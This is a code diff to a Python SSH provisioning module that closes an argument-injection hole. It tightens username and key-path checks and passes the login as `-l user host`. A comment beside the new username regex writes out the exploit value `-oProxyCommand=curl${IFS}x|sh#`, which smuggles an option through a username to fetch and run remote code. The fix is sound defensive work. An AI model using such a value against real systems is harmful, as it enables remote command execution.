@@ -34,6 +34,7 @@ from __future__ import annotations
 import asyncio
 import ipaddress
 import os
+import re
 import socket
 import shutil
 import tempfile
@@ -135,6 +136,27 @@ def ssh_available() -> bool:
 # Credentials — held in memory, wiped after use
 # ---------------------------------------------------------------------------
 
+# An account name, conservatively. The old test was "non-empty, at most 64
+# characters, no whitespace", which lets a name begin with `-` — and the name is
+# pasted into an argv element as `user@host`, where OpenSSH parses a leading `-`
+# as an option and `-o` takes its argument attached. `${IFS}` supplies the spaces
+# this forbids, so `-oProxyCommand=curl${IFS}x|sh#` passed every check and ran
+# through /bin/sh. The destination is also passed as `-l user host` now, so a
+# stray dash can never lead an argv element in the first place.
+_ACCOUNT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_.-]{0,31}$")
+
+
+def _usable_key_path(path: str) -> bool:
+    """A key path we will hand to ``ssh -i``.
+
+    Absolute, no NUL, and — the point — not starting with a dash: `-i` takes a
+    separate argv element, so a value beginning with `-` is parsed as an option
+    of its own."""
+    return (isinstance(path, str) and 0 < len(path) <= 512
+            and "\x00" not in path and not path.startswith("-")
+            and os.path.isabs(path))
+
+
 class SshCredentials:
     """One machine's login material, for one provisioning run.
 
@@ -153,12 +175,12 @@ class SshCredentials:
                  key_passphrase: str | None = None,
                  can_sudo: bool = True, sudo_user: str | None = None,
                  sudo_password: str | None = None) -> None:
-        if not username or len(username) > 64 or any(c.isspace() for c in username):
+        if not _ACCOUNT_RE.match(username or ""):
             raise SshError("invalid username")
-        if sudo_user is not None and (
-                not sudo_user or len(sudo_user) > 64
-                or any(c.isspace() for c in sudo_user)):
+        if sudo_user is not None and not _ACCOUNT_RE.match(sudo_user):
             raise SshError("invalid sudo username")
+        if key_path is not None and not _usable_key_path(key_path):
+            raise SshError("invalid key path")
         self.username = username
         # Whether the login account may itself run sudo, and — when it may not —
         # the account that can. Escalation is stated by the operator rather than
@@ -759,7 +781,10 @@ async def run(host: str, creds: SshCredentials, command: list[str], *,
         argv = ["ssh"] + _base_options(known.path, creds, port, key.path)
         if request_tty:
             argv += ["-tt"]
-        argv += [f"{creds.username}@{host}", "--"] + list(command)
+        # `-l user host`, never `user@host`: gluing them makes one argv element
+        # whose first character the caller chooses, and OpenSSH reads a leading
+        # dash as an option. `--` still separates the remote command.
+        argv += ["-l", creds.username, host, "--"] + list(command)
         return await _spawn_with_pty(argv, creds, stdin_data, timeout,
                                      on_output, tty_stdio=request_tty)
 
